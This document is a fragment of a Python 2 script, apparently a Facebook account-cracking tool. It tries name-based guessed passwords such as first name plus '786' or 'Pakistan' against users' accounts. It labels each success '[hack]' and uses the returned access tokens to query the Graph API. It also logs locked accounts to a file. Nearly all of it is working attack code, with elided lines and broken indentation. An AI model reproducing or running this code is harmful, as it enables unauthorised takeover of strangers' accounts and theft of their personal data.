...
##### LOGO #####
logo = """
\033[1;91m   _______  ______   _______  _______  _______ 
\033[1;92m( (    /|(  ___  )(  __  \ (  ____ \(  ____ \(       )
\033[1;93m|  \  ( || (   ) || (  \  )| (    \/| (    \/| () () |
\033[1;94m|   \ | || (___) || |   ) || (__    | (__    | || || |
\033[1;95m| (\ \) ||  ___  || |   | ||  __)   |  __)   | |(_)| |
\033[1;96m| | \   || (   ) || |   ) || (      | (      | |   | |
\033[1;97m| )  \  || )   ( || (__/  )| (____/\| (____/\| )   ( |
\033[1;98m|/    )_)|/     \|(______/ (_______/(_______/|/     \|                                                     
"""
 
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mMR █████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(0.1)
	...
	def main(arg):
		...
		try:													
			...
			if 'access_token' in q:
				...
				z = json.loads(x.text)
				print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass1 + ' 👽 ' + b['name']
				    ...
				    pass2 = b['first_name'] + '786'										
			            ...
			            if 'access_token' in q:	
				            x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				            z = json.loads(x.text)
				            print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass2 + ' 👽 ' + b['name']
				               cek = open("out/super_cp.txt", "a")
					       ...
					       if 'access_token' in q:	
						       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                       z = json.loads(x.text)
						       print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass3 + ' 👽 ' + b['name']
				                           cek = open("out/super_cp.txt", "a")
						           ...
						           pass4 = b['first_name'] + '1122'											
						                   ...
						                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                   z = json.loads(x.text)
				                                   print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass4 + ' 👽 ' + b['name']
				                                       cek = open("out/super_cp.txt", "a")
						                       ...
						                       if 'access_token' in q:	
						                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                               z = json.loads(x.text)
						                               print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass5 + ' 👽 ' + b['name']
				                                                   cek = open("out/super_cp.txt", "a")
							                           ...
							                           pass6 = 'Pakistan'											
								                           ...
								                           x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                           z = json.loads(x.text)
				                                                           print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass6 + ' 👽 ' + b['name']
				                                                               cek = open("out/super_cp.txt", "a")
								                               ...
								                               if 'access_token' in q:		
				                                                                       x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                       z = json.loads(x.text)
									                               print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass7 + ' 👽 ' + b['name']
				                                                                           cek = open("out/super_cp.txt", "a")
										                           ...
										                           pass8 = b['last_name'] + '786'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                   z = json.loads(x.text)
				                                                                                   print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass8 + ' 👽 ' + b['name']
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print '\x1b[1;36;40m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass8 + ' 👽 ' + b['name']
				                                                                                       cek = open("out/super_cp.txt", "a")
										                                       ...
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;36;40m[hack] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass9 + ' 👽 ' + b['name']
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\033[1;97m[ok] \033[1;97m ' + user  + ' \x1b[1;36;40m|\033[1;97m ' + pass9 + ' 👽 ' + b['name']
				                                                                                                   cek = open("out/super_cp.txt", "a")
